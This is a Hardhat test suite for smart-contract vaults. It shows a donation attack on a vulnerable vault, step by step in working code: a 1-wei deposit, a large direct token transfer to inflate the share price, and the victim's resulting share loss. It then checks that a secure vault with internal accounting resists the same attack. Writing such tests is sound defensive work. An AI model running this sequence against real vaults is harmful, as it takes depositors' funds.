const { expect } = require('chai');
const { ethers } = require('hardhat');

/**
 * Donation Attack Test Suite
 * Tests vulnerability where attacker can inflate share price
 */
describe('Donation Attack Tests', function () {
    let betaToken, vulnerableVault, secureVault;
    let owner, attacker, victim;
    
    beforeEach(async function () {
        [owner, attacker, victim] = await ethers.getSigners();
        
        // Deploy token
        const BetaToken = await ethers.getContractFactory('BetaToken');
        betaToken = await BetaToken.deploy();
        
        // Deploy vulnerable vault
        const BetaVault = await ethers.getContractFactory('BetaVault');
        vulnerableVault = await BetaVault.deploy(betaToken.address);
        
        // Deploy secure vault
        const SecureBetaVault = await ethers.getContractFactory('SecureBetaVault');
        secureVault = await SecureBetaVault.deploy(betaToken.address);
        
        // Fund accounts
        await betaToken.transfer(attacker.address, ethers.utils.parseEther('100000'));
        await betaToken.transfer(victim.address, ethers.utils.parseEther('10000'));
    });
    
    describe('Vulnerable Vault - Donation Attack', function () {
        it('Should demonstrate successful donation attack', async function () {
            console.log('\n=== DONATION ATTACK DEMONSTRATION ===\n');
            
            // Step 1: Attacker deposits 1 wei
            await betaToken.connect(attacker).approve(vulnerableVault.address, ethers.constants.MaxUint256);
            await vulnerableVault.connect(attacker).deposit(1);
            
            const attackerShares1 = await vulnerableVault.balanceOf(attacker.address);
            console.log('Step 1 - Attacker deposited 1 wei, got shares:', attackerShares1.toString());
            
            // Step 2: Attacker donates large amount directly
            const donationAmount = ethers.utils.parseEther('10000');
            await betaToken.connect(attacker).transfer(vulnerableVault.address, donationAmount);
            
            const sharePriceAfterDonation = await vulnerableVault.sharePrice();
            console.log('Step 2 - After donation, share price:', ethers.utils.formatEther(sharePriceAfterDonation));
            
            // Step 3: Victim tries to deposit
            const victimDeposit = ethers.utils.parseEther('1000');
            await betaToken.connect(victim).approve(vulnerableVault.address, victimDeposit);
            
            await vulnerableVault.connect(victim).deposit(victimDeposit);
            
            const victimShares = await vulnerableVault.balanceOf(victim.address);
            console.log('Step 3 - Victim deposited 1000 tokens, got shares:', victimShares.toString());
            
            // Calculate loss
            const expectedShares = victimDeposit;
            const actualShares = victimShares;
            const lossPercentage = ((expectedShares.sub(actualShares)).mul(100)).div(expectedShares);
            
            console.log('\nVictim Loss:', lossPercentage.toString() + '%');
            console.log('\n=== ATTACK SUCCESSFUL ===\n');
            
            // Verify attack worked
            expect(victimShares).to.be.lt(victimDeposit.div(10));
        });
    });
    
    describe('Secure Vault - Attack Mitigation', function () {
        it('Should prevent donation attack with internal accounting', async function () {
            console.log('\n=== TESTING SECURE VAULT ===\n');
            
            await betaToken.connect(attacker).approve(secureVault.address, ethers.constants.MaxUint256);
            
            const firstDeposit = ethers.utils.parseEther('1');
            await secureVault.connect(attacker).deposit(firstDeposit);
            
            const donationAmount = ethers.utils.parseEther('10000');
            await betaToken.connect(attacker).transfer(secureVault.address, donationAmount);
            
            const victimDeposit = ethers.utils.parseEther('1000');
            await betaToken.connect(victim).approve(secureVault.address, victimDeposit);
            await secureVault.connect(victim).deposit(victimDeposit);
            
            const victimShares = await secureVault.balanceOf(victim.address);
            console.log('Victim got shares:', victimShares.toString());
            
            expect(victimShares).to.be.gt(0);
            console.log('\n=== ATTACK PREVENTED ===\n');
        });
    });
});